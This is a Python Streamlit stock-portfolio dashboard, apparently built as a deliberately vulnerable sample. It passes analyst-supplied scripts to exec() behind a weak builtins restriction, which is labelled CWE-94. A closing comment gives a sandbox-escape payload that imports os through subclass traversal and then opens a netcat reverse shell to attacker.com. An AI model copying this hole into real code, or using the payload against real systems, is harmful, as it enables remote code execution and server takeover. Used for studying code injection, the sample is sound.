import os
import sqlite3
import logging
import pandas as pd
import numpy as np
import streamlit as st
from datetime import datetime, timedelta

# Configure logging for the BI Dashboard
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - StreamlitBI - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PortfolioDashboard")

DB_FILE = "portfolio_metrics.db"

def init_portfolio_db():
    """Initializes the SQLite database for the stock portfolio."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE trades (
            trade_id INTEGER PRIMARY KEY AUTOINCREMENT,
            trade_date DATE NOT NULL,
            ticker TEXT NOT NULL,
            action TEXT NOT NULL,
            shares INTEGER NOT NULL,
            price REAL NOT NULL
        )
    ''')

    # Generate mock trading data
    base_date = datetime.now() - timedelta(days=30)
    mock_trades = [
        (base_date.strftime("%Y-%m-%d"), "AAPL", "BUY", 100, 150.50),
        ((base_date + timedelta(days=2)).strftime("%Y-%m-%d"), "MSFT", "BUY", 50, 305.20),
        ((base_date + timedelta(days=5)).strftime("%Y-%m-%d"), "TSLA", "SELL", 20, 240.00),
        ((base_date + timedelta(days=10)).strftime("%Y-%m-%d"), "AAPL", "BUY", 50, 155.00),
        ((base_date + timedelta(days=15)).strftime("%Y-%m-%d"), "AMZN", "BUY", 200, 130.25),
        ((base_date + timedelta(days=20)).strftime("%Y-%m-%d"), "MSFT", "SELL", 10, 315.00),
        ((base_date + timedelta(days=25)).strftime("%Y-%m-%d"), "GOOG", "BUY", 75, 135.50),
    ]
    
    cursor.executemany('''
        INSERT INTO trades (trade_date, ticker, action, shares, price)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_trades)

    conn.commit()
    conn.close()
    logger.info("Portfolio database initialized with mock trade data.")

@st.cache_data
def load_portfolio_data() -> pd.DataFrame:
    """Loads trading data from the SQLite database into a Pandas DataFrame."""
    try:
        conn = sqlite3.connect(DB_FILE)
        df = pd.read_sql_query("SELECT * FROM trades", conn)
        conn.close()
        return df
    except Exception as e:
        logger.error(f"Error loading portfolio data: {e}")
        return pd.DataFrame()

def apply_custom_pandas_transform(df: pd.DataFrame, custom_script: str) -> pd.DataFrame:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Streamlit UI text_area -> 'custom_script' string evaluated via exec()
    """
    logger.info("Applying custom Pandas transformation script...")
    
    # We provide a local context containing the dataframe and common data libraries.
    # The script is expected to modify or query 'df' and assign the output to 'result_df'.
    execution_context = {
        "df": df.copy(),
        "pd": pd,
        "np": np,
        "result_df": None
    }
    
    try:
        # Vulnerability: The BI Dashboard allows data analysts to write arbitrary 
        # Python scripts directly in the web UI to perform complex aggregations or 
        # filtering that aren't natively supported by the standard UI widgets.
        # The application takes this raw string from the Streamlit frontend and 
        # executes it dynamically using Python's exec() function.
        # Although __builtins__ is restricted, an attacker can bypass this sandbox 
        # by navigating the Python object hierarchy (e.g., using subclass traversal 
        # on the provided DataFrame or other objects) to import 'os' and achieve 
        # Remote Code Execution (RCE) on the server hosting the Streamlit app.
        
        # CWE-94 occurs instantly when the untrusted custom_script is executed.
        exec(custom_script, {"__builtins__": {}}, execution_context)
        
        result = execution_context.get("result_df")
        if result is not None and isinstance(result, pd.DataFrame):
            return result
        else:
            logger.warning("Custom script did not produce a valid DataFrame in 'result_df'.")
            return df
            
    except Exception as e:
        logger.error(f"Failed to execute custom transformation script: {e}")
        st.error(f"Execution Error: {str(e)}")
        return df

def main():
    """Main Streamlit application entry point."""
    st.set_page_config(page_title="Advanced Portfolio BI", layout="wide")
    
    init_portfolio_db()
    
    st.title("Advanced Portfolio BI Dashboard")
    st.markdown("Analyze your trading history and apply complex custom Pandas transformations.")
    
    df_trades = load_portfolio_data()
    
    st.header("Raw Trade Data")
    st.dataframe(df_trades, use_container_width=True)
    
    st.sidebar.header("Custom Query Engine")
    st.sidebar.markdown(
        "Write a Python script to transform the `df` DataFrame. "
        "Save your final output to the `result_df` variable."
    )
    
    # The untrusted string is sourced directly from the UI widget
    default_script = "# Example: Filter for BUY actions only\nresult_df = df[df['action'] == 'BUY']"
    user_script = st.sidebar.text_area("Pandas Script:", value=default_script, height=200)
    
    if st.sidebar.button("Execute Script"):
        with st.spinner("Applying custom transformation..."):
            # Pass the untrusted string directly to the vulnerable function
            transformed_df = apply_custom_pandas_transform(df_trades, user_script)
            
            st.header("Transformed Results")
            st.dataframe(transformed_df, use_container_width=True)
            
            # Show some basic metrics on the transformed data
            if not transformed_df.empty and 'price' in transformed_df.columns:
                total_value = transformed_df['price'].sum()
                st.metric(label="Total Value of Selection", value=f"${total_value:,.2f}")

if __name__ == "__main__":
    # Example Malicious Trigger:
    # 1. Attacker accesses the Streamlit web interface.
    # 2. Attacker inputs a malicious script designed to escape the execution sandbox
    #    into the "Pandas Script" text area:
    #
    #    # Bypass __builtins__ restriction via object hierarchy
    #    escape = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os')
    #    escape.system('nc -e /bin/sh attacker.com 4444')
    #    result_df = df
    #
    # 3. Attacker clicks "Execute Script" on the frontend.
    # 4. The untrusted input is passed to exec(), executing the payload and granting RCE.
    
    main()
